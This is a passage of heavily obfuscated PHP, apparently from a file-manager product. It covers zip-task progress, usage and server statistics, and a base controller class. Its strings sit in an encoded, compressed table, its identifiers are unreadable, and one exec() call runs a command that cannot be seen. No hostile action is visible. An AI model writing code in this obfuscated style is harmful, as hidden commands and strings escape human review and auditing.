$Æğ§†Ç‰[$‡§ˆÎĞ÷[1721]] = 0; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1722]] = 0; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1719]] = $‡§ˆÎĞ÷[12]; $Æğ§†Ç‰[$‡§ˆÎĞ÷[1726]] = 0; $Æğ§†Ç‰[$‡§ˆÎĞ÷[765]] = $¡íœ§’£[$‡§ˆÎĞ÷[76]]; $this->update(); self::log($‡§ˆÎĞ÷[1783] . json_encode(array($Æğ§†Ç‰, $¡íœ§’£))); } public function nameParse($ğÙ¡ü¸ç) { $ø÷ÛÜîÕ =& $_SERVER[Ì¥ŞÒ°£]; $¹—…‡šõ =& $this->task; if ($¹—…‡šõ[$ø÷ÛÜîÕ[1781]] == $ø÷ÛÜîÕ[1200]) { $¹—…‡šõ[$ø÷ÛÜîÕ[1781]] = $ø÷ÛÜîÕ[313]; $¹—…‡šõ[$ø÷ÛÜîÕ[1726]] = 0; $¹—…‡šõ[$ø÷ÛÜîÕ[765]] = 0; } $ŠºêÔ× = get_path_this($ğÙ¡ü¸ç); if (strstr($ŠºêÔ×, $ø÷ÛÜîÕ[10])) { $¹—…‡šõ[$ø÷ÛÜîÕ[1668]] += 1; $¹—…‡šõ[$ø÷ÛÜîÕ[788]] += 1; } $¹—…‡šõ[$ø÷ÛÜîÕ[1719]] = $ğÙ¡ü¸ç; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Ş×êÈ¤§ =& $_SERVER[Ì¥ŞÒ°£]; parent::startAfter(); Hook::bind($Ş×êÈ¤§[1784], array($this, $Ş×êÈ¤§[1779])); $µ°ƒ–øä =& $this->task; $µ°ƒ–øä[$Ş×êÈ¤§[1781]] = $Ş×êÈ¤§[1200]; if (!$µ°ƒ–øä[$Ş×êÈ¤§[1567]]) { $µ°ƒ–øä[$Ş×êÈ¤§[1567]] = LNG($Ş×êÈ¤§[1785]); } } protected function endAfter() { $úåòˆ‰ =& $_SERVER[Ì¥ŞÒ°£]; parent::endAfter(); Hook::unbind($úåòˆ‰[1784], array($this, $úåòˆ‰[1779])); } public function updateAfter() { $´»” =& $_SERVER[Ì¥ŞÒ°£]; $¾Ã‘Ãóù =& $this->task; if (!$¾Ã‘Ãóù[$´»”[788]] || !$¾Ã‘Ãóù[$´»”[765]]) { return; } if ($¾Ã‘Ãóù[$´»”[1781]] == $´»”[1200]) { $”ˆ´«  = $¾Ã‘Ãóù[$´»”[1722]]; if ($¾Ã‘Ãóù[$´»”[1723]] != $´»”[1200]) { $”ˆ´«  = 0; } $ÍÈ¢¯áĞ = ($¾Ã‘Ãóù[$´»”[1726]] + $”ˆ´« ) / $¾Ã‘Ãóù[$´»”[765]]; $¾Ã‘Ãóù[$´»”[1669]] = $ÍÈ¢¯áĞ * 0.3; } else { if ($¾Ã‘Ãóù[$´»”[1781]] == $´»”[313]) { $ÍÈ¢¯áĞ = $¾Ã‘Ãóù[$´»”[1668]] / $¾Ã‘Ãóù[$´»”[788]]; $¾Ã‘Ãóù[$´»”[1669]] = 0.3 + $ÍÈ¢¯áĞ * 0.5; } else { if ($¾Ã‘Ãóù[$´»”[1781]] == $´»”[107]) { $ÍÈ¢¯áĞ = 0; if ($¾Ã‘Ãóù[$´»”[1721]]) { $ÍÈ¢¯áĞ = $¾Ã‘Ãóù[$´»”[1722]] / $¾Ã‘Ãóù[$´»”[1721]]; } $¾Ã‘Ãóù[$´»”[1669]] = 0.3 + 0.5 + $ÍÈ¢¯áĞ * 0.2; } } } if ($¾Ã‘Ãóù[$´»”[1669]] > 0) { $ö¸‚Îæ¸ = timeFloat() - $¾Ã‘Ãóù[$´»”[1671]] - $¾Ã‘Ãóù[$´»”[1674]]; $¾Ã‘Ãóù[$´»”[1675]] = $ö¸‚Îæ¸ * (1 - $¾Ã‘Ãóù[$´»”[1669]]) / $¾Ã‘Ãóù[$´»”[1669]]; } } public function copyFileStart($ÛŸ ¼Ñ, $Ş£é¦üŸ, $´Š¬ªÛ, $‚ç¸³å¼, $ÇÁŞÀ¤, $„€í÷–‹) { $½Ô‘Âç =& $_SERVER[Ì¥ŞÒ°£]; parent::copyFileStart($ÛŸ ¼Ñ, $Ş£é¦üŸ, $´Š¬ªÛ, $‚ç¸³å¼, $ÇÁŞÀ¤, $„€í÷–‹); $ßÈø³€‚ =& $this->task; if ($ßÈø³€‚[$½Ô‘Âç[1781]] == $½Ô‘Âç[313]) { $ßÈø³€‚[$½Ô‘Âç[1781]] = $½Ô‘Âç[107]; } $this->update(); } public function copyFileEnd($ÜÜÎ‡‡Í, $©éÈÌë, $©öÄ“‹, $Ìšò‘©ˆ, $ÍÀÛÄ½š, $ºµÊ¯šÈ) { $ïìü°« =& $_SERVER[Ì¥ŞÒ°£]; $„ˆ‘üØ =& $this->task; $„ˆ‘üØ[$ïìü°«[1722]] = $„ˆ‘üØ[$ïìü°«[1721]]; $„ˆ‘üØ[$ïìü°«[1726]] += $„ˆ‘üØ[$ïìü°«[1721]]; $„ˆ‘üØ[$ïìü°«[1723]] = $ïìü°«[12]; $this->update(); } public function nameParse($µ„ŸÎš¡) { $Õ‰¶£ =& $_SERVER[Ì¥ŞÒ°£]; $Ö¿ÛŠı =& $this->task; if ($Ö¿ÛŠı[$Õ‰¶£[1668]] < $Ö¿ÛŠı[$Õ‰¶£[788]]) { $‰ŒÎ™ç = get_path_this($µ„ŸÎš¡); if (strstr($‰ŒÎ™ç, $Õ‰¶£[10])) { $Ö¿ÛŠı[$Õ‰¶£[1668]] += 1; } } if ($Ö¿ÛŠı[$Õ‰¶£[1781]] == $Õ‰¶£[1200]) { $Ö¿ÛŠı[$Õ‰¶£[1781]] = $Õ‰¶£[313]; } $Ö¿ÛŠı[$Õ‰¶£[1719]] = $µ„ŸÎš¡; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($¬©Ü™ª¬) { $ƒµ¨£Ì± =& $_SERVER[Ì¥ŞÒ°£]; $‡Ñ´Ó¿ù = array($ƒµ¨£Ì±[600] => array($ƒµ¨£Ì±[33] => $ƒµ¨£Ì±[1786], $ƒµ¨£Ì±[273] => array($ƒµ¨£Ì±[224], $ƒµ¨£Ì±[767], $ƒµ¨£Ì±[1787], $ƒµ¨£Ì±[1788])), $ƒµ¨£Ì±[1789] => array($ƒµ¨£Ì±[33] => $ƒµ¨£Ì±[1790], $ƒµ¨£Ì±[273] => array($ƒµ¨£Ì±[224], $ƒµ¨£Ì±[765], $ƒµ¨£Ì±[1791], $ƒµ¨£Ì±[1792], $ƒµ¨£Ì±[1793]))); if (!isset($‡Ñ´Ó¿ù[$¬©Ü™ª¬])) { return !1; } $this->optionType = $‡Ñ´Ó¿ù[$¬©Ü™ª¬][$ƒµ¨£Ì±[33]]; $this->field = $‡Ñ´Ó¿ù[$¬©Ü™ª¬][$ƒµ¨£Ì±[273]]; return !0; } public function listData($î‘‰ğÀ¤ = false, $„ö‹áÔ¨ = "\x6d\x6f\x64\x69\x66\171\x54\151\155\145", $ø£®§… = false) { return parent::listData($î‘‰ğÀ¤, $„ö‹áÔ¨, $ø£®§…); } public function trendList($¤»šø®“) { $œù¡Í›İ =& $_SERVER[Ì¥ŞÒ°£]; $‘·Œğ’š = $this->listData(); if ($‘·Œğ’š) { $û°áÒÉ = end($‘·Œğ’š); $¡ª«äÎ¡ = date($œù¡Í›İ[1794], strtotime($œù¡Í›İ[1795])); if ($û°áÒÉ[$œù¡Í›İ[224]] == $¡ª«äÎ¡) { return $‘·Œğ’š; } $ûäì£ıÔ = strtotime($û°áÒÉ[$œù¡Í›İ[224]]); } if (!isset($ûäì£ıÔ)) { $ÙÛïè™Ó = $¤»šø®“ == $œù¡Í›İ[600] ? $œù¡Í›İ[535] : $œù¡Í›İ[827]; $ûäì£ıÔ = Model($ÙÛïè™Ó)->min($œù¡Í›İ[200]); } $»Ø¬Ú = $œù¡Í›İ[1796] . ucfirst($¤»šø®“); $Ø£Ç§­ì = $this->dateList($ûäì£ıÔ); foreach ($Ø£Ç§­ì as $¡ª«äÎ¡) { $this->{$»Ø¬Ú}($¡ª«äÎ¡); } return $this->listData(); } private function dateList($î ûâºà) { $ÂÆúÅ´ =& $_SERVER[Ì¥ŞÒ°£]; $¹ÓİÂ· = $î ûâºà; $ÏÉ¢Â¹ = strtotime($ÂÆúÅ´[1795]); $œıƒÅ– = array(); while ($¹ÓİÂ· <= $ÏÉ¢Â¹) { $œıƒÅ–[] = date($ÂÆúÅ´[1794], $¹ÓİÂ·); $¹ÓİÂ· = strtotime($ÂÆúÅ´[1797], $¹ÓİÂ·); } return $œıƒÅ–; } public function _recordUser($ç†— Ñ„ = '') { $ô½ï¶ëœ =& $_SERVER[Ì¥ŞÒ°£]; $êäÜä¹ = strtotime(date($ô½ï¶ëœ[1798], strtotime($ç†— Ñ„))); $‘Ş½¯“ = strtotime(date($ô½ï¶ëœ[1799], strtotime($ç†— Ñ„))); $åïÖá„Á = array($ô½ï¶ëœ[200] => array($ô½ï¶ëœ[1018], $‘Ş½¯“)); $ôù—¶ƒ§ = Model($ô½ï¶ëœ[535])->where($åïÖá„Á)->count($ô½ï¶ëœ[1667]); $åïÖá„Á[$ô½ï¶ëœ[200]] = array($ô½ï¶ëœ[333], array($êäÜä¹, $‘Ş½¯“)); $òÔÌ¹­“ = Model($ô½ï¶ëœ[535])->where($åïÖá„Á)->count($ô½ï¶ëœ[1667]); $åïÖá„Á[$ô½ï¶ëœ[33]] = $ô½ï¶ëœ[1800]; $Øçç¾ø» = Model($ô½ï¶ëœ[1801])->where($åïÖá„Á)->count($ô½ï¶ëœ[1802]); $ ıñîîÜ = array($ô½ï¶ëœ[224] => $ç†— Ñ„, $ô½ï¶ëœ[767] => (int) $ôù—¶ƒ§, $ô½ï¶ëœ[1787] => (int) $òÔÌ¹­“, $ô½ï¶ëœ[1788] => (int) $Øçç¾ø»); return $this->insert($ ıñîîÜ); } public function _recordStore($àã¼¬â = '') { $Š¬ï¯Õ‘ =& $_SERVER[Ì¥ŞÒ°£]; $ˆ“ŠÙ–Ú = strtotime(date($Š¬ï¯Õ‘[1799], strtotime($àã¼¬â))); $öÖáÄÔõ = array($Š¬ï¯Õ‘[200] => array($Š¬ï¯Õ‘[1018], $ˆ“ŠÙ–Ú)); $Ç­“Ç = Model($Š¬ï¯Õ‘[471])->where($öÖáÄÔõ)->sum($Š¬ï¯Õ‘[76]); $öÖáÄÔõ[$Š¬ï¯Õ‘[410]] = 0; $›àæ‹£¦ = Model($Š¬ï¯Õ‘[827])->where($öÖáÄÔõ)->sum($Š¬ï¯Õ‘[76]); $öÖáÄÔõ[$Š¬ï¯Õ‘[411]] = 1; $ÅÕ½şúã = Model($Š¬ï¯Õ‘[827])->where($öÖáÄÔõ)->sum($Š¬ï¯Õ‘[76]); $öÖáÄÔõ[$Š¬ï¯Õ‘[411]] = 2; $ïØñ¦ = Model($Š¬ï¯Õ‘[827])->where($öÖáÄÔõ)->sum($Š¬ï¯Õ‘[76]); $ñÏ‘Ô“ú = array($Š¬ï¯Õ‘[224] => $àã¼¬â, $Š¬ï¯Õ‘[765] => (int) $›àæ‹£¦, $Š¬ï¯Õ‘[1791] => (int) $Ç­“Ç, $Š¬ï¯Õ‘[1792] => (int) $ÅÕ½şúã, $Š¬ï¯Õ‘[1793] => (int) $ïØñ¦); return $this->insert($ñÏ‘Ô“ú); } public function trend($¾¢áöáÔ, $ÍÁĞÀ¿†) { $ÔÇŠ´˜ˆ =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->init($¾¢áöáÔ)) { return !1; } $÷¯ÖÚû = $this->trendList($¾¢áöáÔ); if ($÷¯ÖÚû && $ÍÁĞÀ¿† != $ÔÇŠ´˜ˆ[1640]) { $‘ƒŸ®¨Ö = $÷¯ÖÚû[0][$ÔÇŠ´˜ˆ[224]]; $¸€•‹‡¼ = $this->validDate($ÍÁĞÀ¿†, $‘ƒŸ®¨Ö); $§ù§’æÏ = array(); $Â’»àµç = array_to_keyvalue($÷¯ÖÚû, $ÔÇŠ´˜ˆ[224]); foreach ($¸€•‹‡¼ as $íƒİ³š°) { if (isset($Â’»àµç[$íƒİ³š°])) { $É‰Üõ¼ø = $Â’»àµç[$íƒİ³š°]; } else { $É‰Üõ¼ø = end($÷¯ÖÚû); $É‰Üõ¼ø[$ÔÇŠ´˜ˆ[224]] = $íƒİ³š°; if ($¾¢áöáÔ == $ÔÇŠ´˜ˆ[600]) { $É‰Üõ¼ø[$ÔÇŠ´˜ˆ[1787]] = $É‰Üõ¼ø[$ÔÇŠ´˜ˆ[1788]] = 0; } } $§ù§’æÏ[] = $É‰Üõ¼ø; } $÷¯ÖÚû = $§ù§’æÏ; } $ÂÂÙ½Êõ = array($ÔÇŠ´˜ˆ[600] => array($ÔÇŠ´˜ˆ[767] => LNG($ÔÇŠ´˜ˆ[1803]), $ÔÇŠ´˜ˆ[1787] => LNG($ÔÇŠ´˜ˆ[1804]), $ÔÇŠ´˜ˆ[1788] => LNG($ÔÇŠ´˜ˆ[1805])), $ÔÇŠ´˜ˆ[1789] => array($ÔÇŠ´˜ˆ[765] => LNG($ÔÇŠ´˜ˆ[1806]), $ÔÇŠ´˜ˆ[1791] => LNG($ÔÇŠ´˜ˆ[1807]), $ÔÇŠ´˜ˆ[1792] => LNG($ÔÇŠ´˜ˆ[1808]), $ÔÇŠ´˜ˆ[1793] => LNG($ÔÇŠ´˜ˆ[1809]))); $—…¾Ãœİ = array($ÔÇŠ´˜ˆ[600] => $ÔÇŠ´˜ˆ[1810], $ÔÇŠ´˜ˆ[1789] => $ÔÇŠ´˜ˆ[76]); if (empty($÷¯ÖÚû)) { $íƒİ³š° = date($ÔÇŠ´˜ˆ[1794], strtotime($ÔÇŠ´˜ˆ[1795])); $Óı„Ş‘ = array($ÔÇŠ´˜ˆ[224] => $íƒİ³š°); foreach ($ÂÂÙ½Êõ[$¾¢áöáÔ] as $ü”ö­î¶ => $ÃÇì³©à) { $Óı„Ş‘[$ü”ö­î¶] = 0; } $÷¯ÖÚû[] = $Óı„Ş‘; } $«é½Á…° = array(); foreach ($÷¯ÖÚû as $ÃÇì³©à) { if ($¾¢áöáÔ == $ÔÇŠ´˜ˆ[1789] && $ÃÇì³©à[$ÔÇŠ´˜ˆ[1791]] > $ÃÇì³©à[$ÔÇŠ´˜ˆ[765]]) { $ÃÇì³©à[$ÔÇŠ´˜ˆ[1791]] = $ÃÇì³©à[$ÔÇŠ´˜ˆ[765]]; } foreach ($ÂÂÙ½Êõ[$¾¢áöáÔ] as $ü”ö­î¶ => $ŸÉ×óâ²) { $É‰Üõ¼ø = array($ÔÇŠ´˜ˆ[224] => $ÃÇì³©à[$ÔÇŠ´˜ˆ[224]], $ÔÇŠ´˜ˆ[1567] => $ŸÉ×óâ²); $É‰Üõ¼ø[$—…¾Ãœİ[$¾¢áöáÔ]] = isset($ÃÇì³©à[$ü”ö­î¶]) ? $ÃÇì³©à[$ü”ö­î¶] : 0; $«é½Á…°[] = $É‰Üõ¼ø; } } return $«é½Á…°; } public function validDate($€Ø‰šÃå, $¨¥™ß­) { $“º‘†¼ä =& $_SERVER[Ì¥ŞÒ°£]; $ƒê¥Äêê = date($“º‘†¼ä[1794], strtotime($“º‘†¼ä[1795])); $Øè¹ìĞÓ = array($ƒê¥Äêê); switch ($€Ø‰šÃå) { case $“º‘†¼ä[1647]: $«™£ºôÍ = mktime(0, 0, 0, date($“º‘†¼ä[1811]), date($“º‘†¼ä[1389]) - date($“º‘†¼ä[1452]) + 7 - 7, date($“º‘†¼ä[1812])); $×Ú”•şš = 0; do { $Ä©Ò¯®í = date($“º‘†¼ä[1794], $«™£ºôÍ - 3600 * 24 * 7 * $×Ú”•şš); $Øè¹ìĞÓ[] = $Ä©Ò¯®í; $×Ú”•şš++; } while ($¨¥™ß­ < $Ä©Ò¯®í); break; case $“º‘†¼ä[1645]: $×Ú”•şš = 1; do { $åİÛŸà— = date($“º‘†¼ä[1813], strtotime("\x2d\x20{$×Ú”•şš}\x20\x6d\157\156\164\x68\x73")); $Øè¹ìĞÓ[] = $åİÛŸà—; $×Ú”•şš++; } while ($¨¥™ß­ < $åİÛŸà—); break; case $“º‘†¼ä[1814]: $ˆÚˆ¿ÃÇ = (int) date($“º‘†¼ä[1812], strtotime($¨¥™ß­)); $ÆÈÕ¥ÛÕ = (int) date($“º‘†¼ä[1812]); if ($ˆÚˆ¿ÃÇ >= $ÆÈÕ¥ÛÕ) { break; } for ($ˆÚˆ¿ÃÇ; $ˆÚˆ¿ÃÇ < $ÆÈÕ¥ÛÕ; $ˆÚˆ¿ÃÇ++) { $Øè¹ìĞÓ[] = $ˆÚˆ¿ÃÇ . $“º‘†¼ä[1815]; } break; default: break; } if ($¨¥™ß­ > end($Øè¹ìĞÓ)) { array_pop($Øè¹ìĞÓ); } sort($Øè¹ìĞÓ); return $Øè¹ìĞÓ; } public function listTable($á®·úÅ) { $Å½¬ºÂ° = ucfirst($á®·úÅ); return Model($Å½¬ºÂ°)->listData(); } public function option($èÃàåú±) { $µÙ¦¦¹ = $_SERVER[Ì¥ŞÒ°£][1816] . ucfirst($èÃàåú±); return $this->{$µÙ¦¦¹}(); } private function optionUser() { $ù™×ı‡¯ =& $_SERVER[Ì¥ŞÒ°£]; $µ¯ñ†Ô = Model($ù™×ı‡¯[535])->count($ù™×ı‡¯[1667]); $Æ®ÖĞ”› = Model($ù™×ı‡¯[535])->where($ù™×ı‡¯[1817])->count($ù™×ı‡¯[1667]); $ßŠˆü´É = intval($GLOBALS[$ù™×ı‡¯[6]][$ù™×ı‡¯[349]][$ù™×ı‡¯[1622]]) / 3600; $Çâ®ıŸÙ = strtotime("\x2d{$ßŠˆü´É}\40\x68\x6f\165\162\163"); $ÏªŸïÕ = strtotime(date($ù™×ı‡¯[1798])); if ($Çâ®ıŸÙ < $ÏªŸïÕ) { $Çâ®ıŸÙ = $ÏªŸïÕ; } $¹¨ÚŞŒÊ = array($ù™×ı‡¯[1818] => array($ù™×ı‡¯[1019], $Çâ®ıŸÙ)); $˜û’ƒØ = (int) Model($ù™×ı‡¯[535])->where($¹¨ÚŞŒÊ)->count($ù™×ı‡¯[1667]); if (!$˜û’ƒØ) { $˜û’ƒØ = 1; } $¹¨ÚŞŒÊ = array($ù™×ı‡¯[1818] => array($ù™×ı‡¯[1019], $ÏªŸïÕ)); $Ï’„‰Ä = Model($ù™×ı‡¯[535])->where($¹¨ÚŞŒÊ)->count($ù™×ı‡¯[1667]); return array($ù™×ı‡¯[761] => (int) $µ¯ñ†Ô, $ù™×ı‡¯[1819] => (int) ($µ¯ñ†Ô - $Æ®ÖĞ”›), $ù™×ı‡¯[1820] => (int) $Æ®ÖĞ”›, $ù™×ı‡¯[1821] => (int) $Ï’„‰Ä, $ù™×ı‡¯[1822] => $˜û’ƒØ); } private function optionFile() { $íè×­Äğ =& $_SERVER[Ì¥ŞÒ°£]; $†ß¥õ¡× = $this->sourceSize(); $“ã€Ê = $†ß¥õ¡×[$íè×­Äğ[76]]; $™ÔõëÂİ = $†ß¥õ¡×[$íè×­Äğ[1791]]; $³¼ĞĞò„ = Model($íè×­Äğ[827])->where(array($íè×­Äğ[410] => 0))->count($íè×­Äğ[402]); $£Ãï÷×œ = array($íè×­Äğ[410] => 0, $íè×­Äğ[200] => array($íè×­Äğ[1019], strtotime(date($íè×­Äğ[1798])))); $–ÚÈª’´ = Model($íè×­Äğ[827])->where($£Ãï÷×œ)->sum($íè×­Äğ[76]); $é¤¢Éâ’ = Model($íè×­Äğ[827])->where($£Ãï÷×œ)->count($íè×­Äğ[402]); return array($íè×­Äğ[765] => $“ã€Ê, $íè×­Äğ[1791] => $™ÔõëÂİ, $íè×­Äğ[1823] => $“ã€Ê - $™ÔõëÂİ, $íè×­Äğ[1824] => (int) $–ÚÈª’´, $íè×­Äğ[767] => (int) $³¼ĞĞò„, $íè×­Äğ[1825] => (int) $é¤¢Éâ’); } private function optionAccess() { $ÖàË¹Í¸ =& $_SERVER[Ì¥ŞÒ°£]; return array($ÖàË¹Í¸[761] => $this->typeLogCnt(), $ÖàË¹Í¸[107] => $this->typeLogCnt($ÖàË¹Í¸[107]), $ÖàË¹Í¸[452] => $this->typeLogCnt($ÖàË¹Í¸[452]), $ÖàË¹Í¸[1826] => $this->typeLogCnt($ÖàË¹Í¸[1826]), $ÖàË¹Í¸[1827] => $this->typeLogCnt($ÖàË¹Í¸[1827]), $ÖàË¹Í¸[600] => $this->typeLogCnt($ÖàË¹Í¸[12], $ÖàË¹Í¸[1802])); } private function typeLogCnt($§á¥ĞŠŠ = '', $ˆÇçæ = "\151\144") { $‚çÏşËÏ =& $_SERVER[Ì¥ŞÒ°£]; $ã£öÀ ¬ = array($‚çÏşËÏ[107] => array($‚çÏşËÏ[1828], $‚çÏşËÏ[1829]), $‚çÏşËÏ[452] => array($‚çÏşËÏ[1830], $‚çÏşËÏ[1831]), $‚çÏşËÏ[1826] => array($‚çÏşËÏ[1832], $‚çÏşËÏ[1833], $‚çÏşËÏ[1834]), $‚çÏşËÏ[1827] => array($‚çÏşËÏ[1835], $‚çÏşËÏ[1836]), $‚çÏşËÏ[1837] => array($‚çÏşËÏ[1838], $‚çÏşËÏ[1839], $‚çÏşËÏ[1840])); $Ÿ’åİòÓ = strtotime(date($‚çÏşËÏ[1798])); $ÍÄ¬â¦  = array($‚çÏşËÏ[200] => array($‚çÏşËÏ[1019], $Ÿ’åİòÓ)); if ($§á¥ĞŠŠ) { $ÍÄ¬â¦ [$‚çÏşËÏ[33]] = array($‚çÏşËÏ[7], $ã£öÀ ¬[$§á¥ĞŠŠ]); } $¬¥¡½Ù“ = Model($‚çÏşËÏ[1801])->where($ÍÄ¬â¦ )->count($ˆÇçæ); return (int) $¬¥¡½Ù“; } private function optionServer() { $ÒÍ×¨şº =& $_SERVER[Ì¥ŞÒ°£]; $©Á­­ëğ = $this->diskDriver(); $ÂöüÇ×œ = KodIO::defaultDriver(); $Ñš¥‘Ãç = array($ÒÍ×¨şº[819] => $ÂöüÇ×œ[$ÒÍ×¨şº[399]]); $à¸ = Model($ÒÍ×¨şº[471])->where($Ñš¥‘Ãç)->sum($ÒÍ×¨şº[76]); $òš’ÒÍ = explode($ÒÍ×¨şº[53], $_SERVER[$ÒÍ×¨şº[143]]); $¢ûºñ‡¶ = $òš’ÒÍ[0]; $£³…Êò = $GLOBALS[$ÒÍ×¨şº[6]][$ÒÍ×¨şº[21]]; $åÕï’çÊ = $£³…Êò[$ÒÍ×¨şº[981]]; if ($åÕï’çÊ == $ÒÍ×¨şº[969]) { $¸™ÛÛÁ· = explode($ÒÍ×¨şº[1285], $£³…Êò[$ÒÍ×¨şº[980]]); $åÕï’çÊ = $¸™ÛÛÁ·[0]; } if ($åÕï’çÊ == $ÒÍ×¨şº[917] || $åÕï’çÊ == $ÒÍ×¨şº[806]) { $íÑ·–º = Model()->db()->query($ÒÍ×¨şº[1841]); $™ş—ü‹ = $íÑ·–º[0] && isset($íÑ·–º[0][$ÒÍ×¨şº[1566]]) ? $íÑ·–º[0][$ÒÍ×¨şº[1566]] : 0; $åÕï’çÊ = $ÒÍ×¨şº[1842] . ($™ş—ü‹ ? $ÒÍ×¨şº[8] . $™ş—ü‹ : $ÒÍ×¨şº[12]); } $¸ºŸ˜§ = $GLOBALS[$ÒÍ×¨şº[6]][$ÒÍ×¨şº[349]][$ÒÍ×¨şº[829]]; return array($ÒÍ×¨şº[1843] => $©Á­­ëğ ? $©Á­­ëğ[$ÒÍ×¨şº[1844]] : 0, $ÒÍ×¨şº[1845] => $©Á­­ëğ ? $©Á­­ëğ[$ÒÍ×¨şº[1846]] : 0, $ÒÍ×¨şº[1847] => (int) $ÂöüÇ×œ[$ÒÍ×¨şº[1844]] * 1024 * 1024 * 1024, $ÒÍ×¨şº[1848] => (int) $à¸, $ÒÍ×¨şº[1849] => ucfirst($¢ûºñ‡¶), $ÒÍ×¨şº[1850] => $ÒÍ×¨şº[1851] . PHP_VERSION, $ÒÍ×¨şº[1852] => phpBuild64() ? 64 : 32, $ÒÍ×¨şº[760] => str_replace($ÒÍ×¨şº[1135], $ÒÍ×¨şº[997], $åÕï’çÊ), $ÒÍ×¨şº[349] => ucfirst($¸ºŸ˜§), $ÒÍ×¨şº[32] => $_SERVER[$ÒÍ×¨şº[1853]]); } private function diskDriver() { $€ÊÕÃÛ¨ =& $_SERVER[Ì¥ŞÒ°£]; $‘–Šˆ × = $€ÊÕÃÛ¨[8]; $˜æÏ“ç² = $GLOBALS[$€ÊÕÃÛ¨[6]][$€ÊÕÃÛ¨[1302]] == $€ÊÕÃÛ¨[1303]; if ($˜æÏ“ç²) { $‘–Šˆ × = $€ÊÕÃÛ¨[1854]; if (function_exists($€ÊÕÃÛ¨[1855])) { exec($€ÊÕÃÛ¨[1856], $–ÄğëÈŠ); $‘–Šˆ × = $–ÄğëÈŠ[1] . $€ÊÕÃÛ¨[8]; } } if (!file_exists($‘–Šˆ ×)) { return; } $ÜÖË¹Ş = @disk_total_space($‘–Šˆ ×); $›†ä©µÃ = $ÜÖË¹Ş - @disk_free_space($‘–Šˆ ×); return array($€ÊÕÃÛ¨[1844] => $ÜÖË¹Ş, $€ÊÕÃÛ¨[1846] => $›†ä©µÃ); } public function fileChart($ê–ôåç) { $Şöß€¶ =& $_SERVER[Ì¥ŞÒ°£]; if (isset($ê–ôåç[$Şöß€¶[1667]])) { return Model($Şöß€¶[827])->userFileTypeProfile($ê–ôåç[$Şöß€¶[1667]]); } if (isset($ê–ôåç[$Şöß€¶[1857]])) { return Model($Şöß€¶[827])->groupFileTypeProfile($ê–ôåç[$Şöß€¶[1857]]); } $—ê²¡¾ = $this->sourceSize(); $ò—ÊÁÄù = array($Şöß€¶[432] => 0, $Şöß€¶[411] => 1); $–©Ğ‹Êı = Model($Şöß€¶[827])->where($ò—ÊÁÄù)->sum($Şöß€¶[76]); $ò—ÊÁÄù[$Şöß€¶[411]] = 2; $´ıÇÌõÔ = Model($Şöß€¶[827])->where($ò—ÊÁÄù)->sum($Şöß€¶[76]); return array($Şöß€¶[765] => $—ê²¡¾[$Şöß€¶[76]], $Şöß€¶[1791] => $—ê²¡¾[$Şöß€¶[1791]], $Şöß€¶[1792] => (int) $–©Ğ‹Êı, $Şöß€¶[1793] => (int) $´ıÇÌõÔ); } private function sourceSize() { $×ûëù…ƒ =& $_SERVER[Ì¥ŞÒ°£]; $ÃÊçà÷¥ = Model($×ûëù…ƒ[827])->where(array($×ûëù…ƒ[410] => 0))->sum($×ûëù…ƒ[76]); $½¾ãúòƒ = Model($×ûëù…ƒ[471])->sum($×ûëù…ƒ[76]); if ($½¾ãúòƒ > $ÃÊçà÷¥) { $½¾ãúòƒ = $ÃÊçà÷¥; } return array($×ûëù…ƒ[76] => (int) $ÃÊçà÷¥, $×ûëù…ƒ[1791] => (int) $½¾ãúòƒ); } } goto E¢‹Öøî‹; fÚÀ°ï­ƒ¨: define($_SERVER[Ì¥ŞÒ°£][0], $_SERVER[Ì¥ŞÒ°£][1]); $_SERVER[¦³şÀŒ] = explode($_SERVER[Ì¥ŞÒ°£][2], gzinflate(substr($_SERVER[Ì¥ŞÒ°£][3], 10, -8))); function binCheckEq($‹’Í÷Ë¸, $‚äÑèËà) { return $‹’Í÷Ë¸ == $‚äÑèËà; } goto EŸÍÇ³´Š¯; DóóÀ¸ ††: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ø¹¦ºĞ =& $_SERVER[Ì¥ŞÒ°£]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ø¹¦ºĞ[6]] =& $config; $this->values[$ø¹¦ºĞ[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ø¹¦ºĞ[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÇÑó«ğÜ) { if (1 === func_num_args()) { $this->{$ÇÑó«ğÜ} = new $ÇÑó«ğÜ(); } else { $Ø‹¿İğ§ = new ReflectionClass($ÇÑó«ğÜ); $éÆ¶±‘ = func_get_args(); array_shift($éÆ¶±‘); $this->{$ÇÑó«ğÜ} = $Ø‹¿İğ§->newInstanceArgs($éÆ¶±‘); } return $this->{$ÇÑó«ğÜ}; } public function routeBind($ÍŞ¸ªÃš, $Èó»»¡©, $“ Ïèô° = 3) { $ª†›¿Ö¥ =& $_SERVER[Ì¥ŞÒ°£]; $°¼ÛñÕÆ = $this->in[$ª†›¿Ö¥[9]]; $ÍŞ¸ªÃš = str_replace($ª†›¿Ö¥[10], $ª†›¿Ö¥[11], trim(trim($ÍŞ¸ªÃš, $ª†›¿Ö¥[8]), $ª†›¿Ö¥[12])); if (!$ÍŞ¸ªÃš || count($°¼ÛñÕÆ) <= $“ Ïèô°) { return !1; } $ÔˆØé©ü = !0; $æÚ·¦Åä = explode($ª†›¿Ö¥[8], $ÍŞ¸ªÃš); for ($¨Şêü¬Ì = 0; $¨Şêü¬Ì < count($æÚ·¦Åä); $¨Şêü¬Ì++) { if ($æÚ·¦Åä[$¨Şêü¬Ì] != $°¼ÛñÕÆ[$“ Ïèô° + $¨Şêü¬Ì]) { $ÔˆØé©ü = !1; break; } } if (!$ÔˆØé©ü) { return; } call_user_func_array(array($this, $Èó»»¡©), array()); } public function routeArgs($Ÿó¡˜– = 3) { $µÀÓÔÅÚ = $this->in[$_SERVER[Ì¥ŞÒ°£][9]]; if (count($µÀÓÔÅÚ) <= $Ÿó¡˜–) { return array(); } $óâ­‡Æ = array(); for ($ú¦úˆÜá = $Ÿó¡˜–; $ú¦úˆÜá < count($µÀÓÔÅÚ); $ú¦úˆÜá += 2) { $óâ­‡Æ[$µÀÓÔÅÚ[$ú¦úˆÜá]] = 